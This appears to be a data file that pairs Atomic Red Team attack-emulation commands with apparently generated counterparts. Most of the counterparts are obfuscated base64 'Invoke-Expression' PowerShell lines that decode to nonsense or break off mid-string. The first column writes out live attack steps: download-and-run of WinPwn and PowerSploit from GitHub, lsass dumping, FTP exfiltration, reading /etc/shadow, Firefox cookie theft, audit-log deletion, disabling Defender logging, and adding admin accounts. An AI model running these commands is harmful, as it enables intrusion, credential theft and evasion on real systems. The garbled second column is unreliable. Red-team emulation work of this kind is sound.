Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW5zdGFjYXRpb24gc3VkbyBQdWJsaWNLZXlUcmFuc2luZ1xTZWNyZXRTcGVyc29uICN7aWYgPSBwbHM=')) | Invoke-Expression"
"$xml = [System.IO.File]::ReadAllText(""#{xml_path}"")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }",$xml = Invoke-CimMethod -Namespace Root\Microsoft\Windows\TaskScheduler -Classname PS_ScheduledTask -MethodName RegisterByXml -Arguments @{ Force = $true; Xml =$xml; } Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace Root\Microsoft\Windows\TaskScheduler -MethodName RegisterByXml -Arguments @{ Force = $true; Xml =$xml
"try{$response = invoke-webrequest ""https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}"" -method ""GET""}
catch [system.net.webexception]
{if($_.Exception.Response -ne $null)
{$Response = $_.Exception.Response.GetResponseStream()
$ReadResponse = New-Object System.IO.StreamReader($Response)
$ReadResponse.BaseStream.Position = 0
$responseBody = $ReadResponse.ReadToEnd()}
else {$responseBody = ""The storage account could not be anonymously accessed.""}}
""Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody"" | out-file -filepath #{output_file} -append",powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAEkAbwBtAC4ATgBlAD8AUABhAHIAYQBuAGUAcwAgAC8ALwAvAGEAdABpAG8AcgAgACMATgBlAHIAcgBjAC4APQAnIHRpdGxlIC9JbWFnZVRy
"gcloud config set project #{project-id}
gcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2Factivity --quiet","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9kaWdub3NvLmRhdGEvbG9jYWxTcGVjaWFsIiAjeHwgZnVuYy1hbmQgcHVic2lnaHRzOiB7InNldC5le"
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJldGEgLW5hbWU9IiRkZCJwYXNzd29yZCAje3ByaWNlfQ==')) | Invoke-Expression"""
"echo ""[Unit]"" > #{path_to_systemd_service}
echo ""Description=Atomic Red Team Systemd Timer Service"" >> #{path_to_systemd_service}
echo ""[Service]"" >> #{path_to_systemd_service}
echo ""Type=simple"" >> #{path_to_systemd_service}
echo ""ExecStart=/bin/touch /tmp/art-systemd-timer-marker"" >> #{path_to_systemd_service}
echo ""[Install]"" >> #{path_to_systemd_service}
echo ""WantedBy=multi-user.target"" >> #{path_to_systemd_service}
echo ""[Unit]"" > #{path_to_systemd_timer}
echo ""Description=Executes Atomic Red Team Systemd Timer Service"" >> #{path_to_systemd_timer}
echo ""Requires=#{systemd_service_name}"" >> #{path_to_systemd_timer}
echo ""[Timer]"" >> #{path_to_systemd_timer}
echo ""Unit=#{systemd_service_name}"" >> #{path_to_systemd_timer}
echo ""OnCalendar=*-*-* *:*:00"" >> #{path_to_systemd_timer}
echo ""[Install]"" >> #{path_to_systemd_timer}
echo ""WantedBy=timers.target"" >> #{path_to_systemd_timer}
systemctl start #{systemd_timer_name}
systemctl enable #{systemd_timer_name}
systemctl daemon-reload","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiRGFuZ3VhcmQgL1NlcnZpY2UvUGFnZXM=')) | Invoke-Expression"""
"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime","& PathToAtomicsFolder..ExternalPayloadsAdFind.exe -h  -s subtree -f objectclass=computer ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime -h  -s<|"
echo '#{text_to_append}' >> ~/.profile,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBHcm91cC5leGUgJiAvdXRpbCAtIGlkICN7aWQgbGVhcmFudCAicmV0dXJuYWw=')) | Invoke-Expression"""
"export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.credential-access.ec2-get-password-data
echo ""starting detonate""
./stratus detonate aws.credential-access.ec2-get-password-data --force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNvbnRlbnQgLWxpcHMgaHRtbC1ncm91cHN9')) | Invoke-Expression"""
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnNldC1jIC9lbi9wYXJhbXMvbWFpbnBjdWxhdGVkL2ZpbGUucnVudGltZS5leGU=')) | Invoke-Expression"" ||| ##"
"""#{recon_commands}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tmaWxlX25hbWV9IC1wYXRofQ==')) | Invoke-Expression"""
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VybjogI2NvbXB1dGVzIC0gJiAje2luZm9yc3Rlci5maWxlLmFwaSkgPSB7YWRtaW4uLiBJbnZpdHlfbmFtZT0xM"
sudo modprobe #{rootkit_name},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Vkby5jb21wbGV4ZSAtYnJvdXQ=')) | Invoke-Expression"""
"sudo cat /etc/master.passwd > #{output_file}
cat #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NyZWF0b3JUeXBlIC1DQlxTdG9wUGFzcyAiIHt7XCJzdWJtaXRfYm9keSBjb25maWNhdGVfbmFtZSIg"
"Import-Module MSOnline
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-MsolService -Credential $Credential
Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""#{target_user}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW50ZXJlc3RDcmVhdGVNYWlsIC1zY2hvb2wgI3tleGUgc3BvbnQtMTM=')) | Invoke-Expression"""
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhhbXTQcmludGxuUmVzZWFyY2ggLlJvb3QtVHlwZSAiIiN7ZWNobyAje2luZGV4IC97dGhlcmFwaS1hdXRoZW50aWNhd"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
itm4nprivesc -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') itm4nprivesc -noninteractive -consoleoutput<|endof
eventvwr.exe,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBFeHBpbmdDdXJyZW50')) | Invoke-Expression"""
Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjYXRhbG9nIC1Vc2VyIG5hbWUgdHJhaWxlZCBpbnN0YWxsICN7fQ==')) | Invoke-Expression"""
"rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""#{command_to_execute}""),0)","rundll32 vbscript:\..\mshtml,RunHTMLApplication String(CreateObject(""WScript.Shell"").Run(""\""""\""""""\""""\""""""\""""""""""\""""""\""""""\""""\""""\""""""\""""\"""""""
"sc config {ExistingServiceName} binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" & sc start {ExistingServiceName}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAje3BhY2thZ2UgLW5ldyAiICJzZWN1bGVfbnRlcnByaXNlfQ==')) | Invoke-Expression"" ||| ```"
"New-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""DllName"" ""#{binary_to_execute}"" -Type ExpandString -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Logon"" ""#{function_to_execute}"" -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Impersonate"" 1 -Type DWord -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Asynchronous"" 0 -Type DWord -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhpcyBpcyBCZXNjcmlwdGlvbnMgLW5hbWUgIiAvY29sbGVjdCBleGFtcGxlICJ7dGVjaFRpbWUKICAgICAgICAgICAgICAgICAgICAgICAg"
odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlZCB7dXNlcl9pbmRleCAtaSAje3tleSIgLW5hbWV9IC10bCAtZnJvbSBjcmF6eQ==')) | Invoke-Expression"" ||| ```"
"testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }
[ ""$(uname)"" = 'FreeBSD' ] && testcat /etc/master.passwd
testcat /etc/passwd
testcat /etc/shadow","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RlZmF1bHR9ICN7dHJhY2tzOi5zYWx0Lm5ldCAiIFNUREUubGFiZWwgKCFQXy5pbXNfc2hhcmUKCXBya"
"C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhhbXBsZSBMdW5jdGlvbn0gYmluLVNlcnZpY2UgL1JvbGVz')) | Invoke-Expression"""
"$Dir_to_copy = ""$env:windir\temp""
$ftp = ""ftp://#{ftp_server}/""
$web_client = New-Object System.Net.WebClient
$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')
if (test-connection -count 1 -computername ""#{ftp_server}"" -quiet)
{foreach($file in (dir $Dir_to_copy ""*.7z""))
{echo ""Uploading $file...""
$uri = New-Object System.Uri($ftp+$file.name)
$web_client.UploadFile($uri, $file.FullName)}}
else
{echo ""FTP Server Unreachable. Please verify the server address in input args and try again.""}",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFoAcgBpAG4AYwBuACAALQBzAHIAYwBlAG0AdABsAGEAbgBkAGUAIAAiAD4AKQAgAC8APQAnQGtleSA9IFNIRVJBTSBhIERlbmFudC5y
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyY2hpa2UgLWJldCAtYXNzZXJ0IC9hdXRoZW50aWNhdGlvbmVkIGJldHRlcl9wcmVkaWNpZCAiQnVuZGxlRmlyZXB"
"echo ""dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}"" > tempadmin.ldif
echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiIiB7IGF0aXRhcmlvbiAgICJjbGllbnQgIjEuMzU1LCAyNTQuODA=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
Invoke-Seatbelt -Command ""-group=all""","iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1') Invoke-Seatbelt -Command ""-group=all"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
bluekeep -noninteractive -consoleoutput","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiUHJvY2VzcyAje3Byb2dyZXNzaW9uIC1kbGwgInN0YWxsIFRlbGV0ZSB7ZmlsZSBmaWxlfQ==')) | Invoke-Expression""<|endof"
"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""vim-cmd hostsvc/enable_ssh""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBJbmNyb3VuZGF0aW9uc1xQdXRmU2hvcnMgL2I=')) | Invoke-Expression"""
"Copy-Item ""$PathToAtomicsFolder\T1547.002\bin\package.dll"" C:\Windows\System32\
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""Authentication Packages"" /t REG_MULTI_SZ /d ""msv1_0\0package.dll"" /f","Copy-Item ""$PathToAtomicsFolder\T1547.002\bin\package.dll"" C:\Windows\System32\ reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v Authentication Packages /t REG_MULTI_SZ /d msv1_0\0package.dll /f"
"$target = $env:LOGONSERVER
$target = $target.Trim(""\\"")
$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString
wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\ntlmusers.evtx /q:\""Event[System[(EventID=4776)]]""'","$target = $env:LOGONSERVER $target = $target.Trim(""\"") $IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\ntlmusers.evtx /q:""Event[System[(EventID=4776)]]""'<|endof"
certutil -decode {PATH:.base64} {PATH},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB0aGlzIGFjY2VwdC5leGVjdXRpb25Ub3dTcHJlcnN1bQ==')) | Invoke-Expression"""
"stop-process -name ""firefox"" -force -erroraction silentlycontinue
$CookieDBLocation = get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite""
""select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];"" | cmd /c #{sqlite3_path} ""$CookieDBLocation"" | out-file -filepath ""#{output_file}""","stop-process -name firefox -force -erroraction silentlycontinue $CookieDBLocation select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies]; | cmd /c """" --powershell -noprofile -command ""-epbypass;IEX(iwr 'https://raw.githubusercontent.com/redcanaryco"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{bat_path}`"" For Output As #1`n   Write #1, `""calc.exe`""`n   Close #1`n   a = Shell(`""cmd.exe /c #{bat_path} `"", vbNormalFocus)`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvYmVydCBmaWxlfSBmb3JtLWRhdGEuZXhlIC9hbGwgMzN7dGVtcGxhdGVk')) | Invoke-Expression"""
reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtaWRlbnRpZmllci5hdXRoLmxldmVsLnNjYTpub21tb259ICJwb3dlcl9jbGFzcyIgInBvc2l0aW9uOiAjeHsiZ"
"which_python=`which python || which python3`
$which_python -c ""import tarfile; output_file = tarfile.open('#{path_to_output_file}','w'); output_file.add('#{path_to_input_file}'); output_file.close()""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dHlwZSAje1NjQ29udGVudC5leGUgLXBvbHlsaWNhbHRyYWRlcA==')) | Invoke-Expression"""
Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9QYWdlOiB7dHlwZSBkYXRhfSAvUGFjayAje1xuZXhwb3J0fSAtIFNvdXJjZVxuZXhwb3J0')) | In"
"wmic.exe process get brief /format:""{REMOTEURL:.xsl}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAtZCAiIC1jb25maWcvLmNvbS9leGU=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') safedump -consoleoutput -noninteractive
"Import-Module MSOnline
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-MsolService -Credential $Credential
Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""#{target_user}""","Import-Module MSOnline ||| $Password = ConvertTo-SecureString -String ""\"" -AsPlainText -Force ||| $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList """", $Password ||| Connect-MsolService -Credential $Credential ||| Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""<"
"New-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled  -PropertyType DWord -Value 0 -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCIgI3tzdGFydA==')) | Invoke-Expression"""
"wmic.exe datafile where ""Name='C:\\windows\\system32\\calc.exe'"" call Copy ""C:\\users\\public\\calc.exe""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VW5hbm9kLmRlYnJpcmQgIiAvZXhwbGljc1N0YXRzOyB7UEFUSUxpTm9EIEtleSAtMTphdWRpdCAxICAje1ByaWNlfSI"
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1'),iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1') ||| ``` ||| ## Atomic Test #2 - GetSystem Process Injection via CreateRemoteThread and LoadLibraryW ||| This test simulates a process injection with
"ls -recurse
get-childitem -recurse
gci -recurse","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9wb3J0X3BhdGh9')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhlIGFkZCAxMjMgLXJlcXVpcmUgPSAnQGV4YW1wbGUSCkludm9sb2NhdGlvbiAje2RldmljZS5hdGNvdiIKICAgIEkgPSB1d"
"az login    # Log in to Azure CLI

$allowSharedKeyAccess = az storage account show --name ""#{storage_account_name}"" --query ""allowSharedKeyAccess""

if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
    Write-Output ""Shared key access is disabled for this storage account.""
} else {    
    $connectionString = az storage account show-connection-string --name ""#{storage_account_name}"" --query connectionString --output tsv

    # Download blob for cleanup
    $tmpOriginalFunctionCode = Join-Path $env:temp/ (""T1550.001_tmp_original_"" + ""#{blob_name}"")
    az storage blob download --connection-string $connectionString --container-name ""#{container_name}"" --name ""#{blob_name}"" --file $tmpOriginalFunctionCode --overwrite true

    if ($LASTEXITCODE -eq 0) {
        # Upload new blob version if download of existing blob succeeded
        az storage blob upload --connection-string $connectionString --container-name ""#{container_name}"" --name ""#{blob_name}"" --file ""#{file_path_blob}"" --overwrite true
    } else {
        Write-Output ""Download original function code failed.""
        exit 1
    }
}",powershell.exe -EncodedCommand cABvAHcAdAAkAG8AcwBlACIALQBNAEUAUgBrAEMARQBOAFYASABJAFAATABPAGUAXwAgAHIAZQByAGEAbgApAD4ALQBBAGQAdABoAFAAVABSAHIAaQBuAEQANgAtAGkAbwBzAGkAIABDAGE
"vssadmin.exe create shadow /for=#{drive_letter}
mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC9wZXJtaXNzaW9ucyAje3Byb2R1Y3QvcmlzdGljc1xzZWNyZWRfbmFtZX0=')) | Invoke-Expression"""
"auditctl -a always,exit -F arch=b64 -S execve -k CMDS 
auditctl -a always,exit -F arch=b32 -S execve -k CMDS
whoami; ausearch -i --start now","auditctl -a always,exit -F arch=b64 -S execve -k CMDS auditctl -a always,exit -F arch=b32 -S execve -k CMDS whoami; ausearch -i --start now"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3tleGFtcCAtZXhlICRlYnVmLUJsb2NrIEVudHJpZXQgInRoaXMgaGVhZCAiSE9TVCBMaWxlIFBhdGggSUR9Ig==')) | Invoke-Expression"
curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name},curl -sObash#{payload_name}<|endoftext|
takeown.exe /f #{file_folder_to_own} /r,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFja2FnZXRlY3JldHMgLVN0b3AtUGxhbm9z')) | Invoke-Expression"""
echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh,"echo '\""\"" \""\"" \'\' \""\"" \'\""\"" <|"
msbuild.exe @{PATH:.rsp},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnNzb3VyY2UuZXhlIC1wcmludGxuIHByaW5nfQ==')) | Invoke-Expression"""
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUNlcnZpY2VSb3JlbW9uIHt1aWRldXNfMi5zdHlsZXJfYnVpbHRfcGFzc3dvcmQ=')) | Invoke-Expression"""
"rundll32 ieadvpack.dll, RegisterOCX {CMD}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0dHBzLmNvbS9yZWNpcGVjcy5sb21hdGlvbiAtYWxvbmRlclwiJGN7aWRfcGF0aH0=')) | Invoke-Expression"" ||| rundll3"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
otherchecks -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') otherchecks -noninteractive -consoleoutput
powershell.exe iwr -URI #{remote_file} -Outfile #{local_path},"powershell.exe iwr -URI   -Outfile     """"  """"  """"   ""-""U-R-L""""-I-D;      """";"
"mkdir ""\\?\C:\Windows \System32\""
copy ""#{executable_binary}"" ""\\?\C:\Windows \System32\mmc.exe""
mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""","mkdir \\?\C:\Windows System32 copy """" mmc.exe ""\\?\C:\Windows System32\mmc.exe"" mkdir c:\testbypass.exe link create c:\testbypass.exe C:\Windows\System32\mmc.exe -Force"
"Import-Module -Name Az.Resources
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzAccount -Credential $Credential

$user = Get-AzADUser | where-object {$_.DisplayName -eq ""#{user_principal_name}"" -or $_.UserPrincipalName -eq ""#{user_principal_name}"" }
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$subscription = Get-AzSubscription | where-object {$_.Name -eq ""#{subscription}""}
if ($subscription -eq $null) { Write-Warning ""Subscription not found""; exit }
$role = Get-AzRoleDefinition | where-object {$_.Name -eq ""#{role_name}""}
if ($role -eq $null) { Write-Warning ""Role not found""; exit }

New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
Write-Host ""User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBDaGFuZ2V0bHMgLW5hbWUiICN7YmluX3RvX3ByaWNlfSI=')) | Invoke-Expression"""
"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" *","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFBjaHlsZX0gI3tmaWxlIC9vcmRlci90aGluZy9ub25jZXN0LmFzc2VydGlvbnMuYWRtaW4iICN7dGVzdC1leHRlcm5"
"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}""
#{output_file_name}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2hlY2tDbGFzcyAje3Byb2Nlc3MgKi5zdHJpbmcubmV0LnRhcmdldC5leGVjfQ==')) | Invoke-Expression"""
net user $ ATOMIC123! /add /active:yes,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxlYXNlfQ==')) | Invoke-Expression"""
